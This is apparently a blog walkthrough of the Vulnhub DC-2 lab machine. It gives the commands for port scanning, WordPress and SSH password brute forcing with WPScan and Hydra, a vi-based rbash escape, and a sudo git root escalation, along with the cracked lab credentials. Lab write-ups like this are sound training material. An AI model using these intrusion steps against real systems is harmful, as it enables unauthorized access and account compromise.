---
layout: single
title: Vulnhub DC-2 Walkthrough 
date: 2023-10-19
author_profile: true
categories:
  - DC-Series
tags: []
header:
  overlay_image: /assets/images/dc-2/cover.png
  overlay_filter: 0.3  # optional, darkens the image for readability
  caption: "DC-2 Vulnhub Walkthrough"
excerpt: "Step-by-step walkthrough of the DC-2 machine from Vulnhub."
feature_row:
  - image_path: /assets/images/dc-2/cover.png
    alt: "DC-2 Cover"
    title: "DC-2 Walkthrough"
    excerpt: "A practical guide to rooting the DC-1 Vulnhub machine."
    url: "#"
    btn_label: "Read More"
    btn_class: "btn--primary"
toc: true
toc_sticky: true
---

This box provided a valuable learning experience. To gain the initial foothold, I created a custom word list using the 'cwel' tools. After generating the word list, I executed WPScan with a password brute-force attack, which resulted in discovering two valid credentials for the web console. However, neither of these accounts had admin privileges, so we couldn't obtain a shell from there.

Next, we attempted SSH login, and Tom successfully logged into the machine. The default shell for the 'tom' user was 'rbash,' but we managed to escape from it using the 'vi' editor. This allowed us to access 'flag3.txt,' which contained a clue for switching to the 'jerry' user. We used the passwords obtained from WordPress for 'jerry,' and with 'jerry,' we ran 'git' as root. We successfully abused this to escalate privileges and gain root access.

# Information Gathering

First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.


```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) ; nmap -p$ports -sC -sV -oN nmap/service_scan $IP

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The Nmap results reveal that only two ports are open: port 80 and port 7744, which are hosting the HTTP and SSH servers, respectively. However, the SSH server is listening on an unusual port, as the developer has changed the default one. Unfortunately, I currently don't have any credentials to work with SSH, so I'll focus on the web server for now. 

Nmap indicates that it's redirecting to '[http://dc-2/](http://dc-2/)'. So, as a first step, let's add this entry to our hosts file.

```bash
echo '192.168.197.135 http://dc-2' | sudo tee -a /etc/hosts
```

Now we can access the web server through the url.

# Manual Inspection

![](/assets/images/dc-2/0.png)

It's a WordPress application with a navigation bar containing some links, but there doesn't seem to be any interactive content on the web server. The first idea that came to my mind is to initiate a scan of the application using WPScan. Since there isn't anything to interact with on the web server, I'd like to start by generating a password word list and then run WPScan for potential password brute-forcing in case I discover any valid usernames. To create the word list, I'll make use of the built-in tools available in Kali Linux, specifically the 'cweI' tool.

```bash
Command: cewl -d 3 -w password.txt $URL
Response: CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

![](/assets/images/dc-2/1.png)

Now that we have the word list, we can proceed with running WPScan. Typically, WordPress can reveal usernames if it's not configured securely. One common approach is to first enumerate the users and then construct the word list for the brute force attack. However, to simplify the process, I decided to take a shortcut and performed this step once.

```bash
wpscan --enumerate --passwords password.txt --url $URL

[+] URL: http://dc-2/ [192.168.197.135]
[+] Started: Wed Oct 18 03:58:39 2023

Interesting Finding(s):

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.2
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
--- snip ---
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

This time, I was fortunate enough to discover three users, including the admin. Additionally, it identified passwords for two of the users, except for the admin.

![](/assets/images/dc-2/2.png)

I have checked both users account none of them are admin. So there is no way to get shell from there. As we have two pair of valid user credentials and we saw earlier ssh server is open lets try to attempt password re-use attack against SSH.

SSH brute-force

```bash
hydra -L users.txt -P password.txt ssh://dc-2:7744

[7744][ssh] host: dc-2   login: tom   password: parturient
```

The tom user use the same password for web application and the ssh login. 

# Creds

<aside>
💡 jerry:adipiscing
tom:parturient

</aside>

# Initial Foothold

As hydra confirm tom’s password is valid for ssh, we can just login through ssh.

![](/assets/images/dc-2/3.png)

# Escaping rbash

The default shell is set for tom user was rbash. Which is a restricted bash environment. We need to escape this bash environment for better control over the system. I found some technique, as the vi is present so i decide to use the vi technique.

```bash
vi
:set shell=/bin/sh
:shell
/bin/bash
export PATH=/bin/:/usr/bin/:/usr/local/bin:$PATH
```

![](/assets/images/dc-2/4.png)

Now everything is okay i have a regular shell on the system.

# Post Enumeration

After escaping the 'rbash' shell, I simply ran the 'ls' command and discovered 'flag3.txt.' Inside 'flag3.txt,' there was a message indicating that Tom should switch over to the 'jerry' user. I attempted to switch using the password acquired from WordPress, and it succeeded.

![](/assets/images/dc-2/5.png)

After switch over to jerry i check the sudo permission for the jerry and found jerry can run git with sudo without password.

![](/assets/images/dc-2/6.png)

This is a possible way to elevate our privilege as root. I searched google and found GTFObins exploit.

# Privilege Escalation

At this point escalate our privilege is very easy. We just need to run git using sudo and add some extra flags -p help config and that’s it and we are root.

```
sudo git -p help config
!/bin/sh
```

![](/assets/images/dc-2/root.png)

#h@ppyh@cking